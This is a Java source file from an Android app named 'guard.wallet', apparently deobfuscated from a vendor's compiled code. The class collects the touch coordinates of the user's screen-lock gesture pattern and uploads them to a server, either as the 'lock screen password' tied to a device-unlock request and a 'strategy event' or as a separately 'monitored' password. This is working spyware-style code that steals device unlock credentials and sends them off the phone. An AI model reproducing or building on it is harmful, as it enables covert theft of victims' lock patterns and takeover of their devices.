package com.guard.wallet.plug;

import com.guard.wallet.core.AppUtils;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.RespCipherStateVO;
import java.util.LinkedList;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 手势图案密码点坐标收集器 -- 存储图案锁各触摸点坐标，完成后上传密码。
 *
 * <p>核心职责:
 * <ul>
 *   <li>收集图案锁手势触摸点坐标 ({@link com.guard.wallet.entity.Point})</li>
 *   <li>listenType=1 时作为锁屏密码上传并触发策略事件</li>
 *   <li>其他 listenType 作为监听密码上传</li>
 * </ul>
 *
 * <p>vendor 原始路径: com/guard/wallet/plug/d.java
 */
public class GesturePatternCollector {
    private static final String TAG = "com.guard.wallet.plug.d";

    /** 已收集的手势触摸点坐标列表 */
    public final LinkedList<com.guard.wallet.entity.Point> patternPoints = new LinkedList<>();

    /** 监听请求配置（包含 listenType、subscribeId 等） */
    public ReqListenHelper listenHelper;

    /** 策略事件回调 ID（完成后触发 offerStrategyEvent） */
    public final AtomicReference<String> cipherCodeRef = new AtomicReference<>(null);

    public GesturePatternCollector() {}

    /**
     * 提交收集到的图案密码 -- 根据 listenType 选择上传方式，完成后清空状态。
     */
    public void submitPattern() {
        if (this.listenHelper == null || this.patternPoints.isEmpty()) {
            this.cipherCodeRef.set(null);
            this.patternPoints.clear();
            return;
        }

        try {
            if (java.util.Objects.equals(this.listenHelper.getListenType(), 1)) {
                ReqUnlockDeviceVO vo = new ReqUnlockDeviceVO();
                vo.setPatternCipher(new LinkedList<>(this.patternPoints));
                vo.setCipherGradeCode("PASSWORD_QUALITY_PATTERN");
                vo.setLocked(Boolean.TRUE);
                com.guard.wallet.utils.SharedPrefsManager.C(vo);
                HttpApiManager.uploadLockCipher(vo);
                if (MainApplication.getInstance() != null && !AppUtils.B(this.cipherCodeRef.get())) {
                    MainApplication.getInstance().offerStrategyEvent(this.cipherCodeRef.get());
                }
                Log.d(TAG, "pattern cipher saved: " + vo);
            } else {
                RespCipherStateVO resp = new RespCipherStateVO();
                resp.setListenType(this.listenHelper.getListenType());
                resp.setListenId(this.listenHelper.getListenId());
                resp.setSubscribeId(this.listenHelper.getSubscribeId());
                resp.setCipherGradeCode("PASSWORD_QUALITY_PATTERN");
                resp.setPatternCipher(new LinkedList<>(this.patternPoints));
                HttpApiManager.uploadOtherCipher(resp);
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        } finally {
            this.cipherCodeRef.set(null);
            this.patternPoints.clear();
        }
    }
}
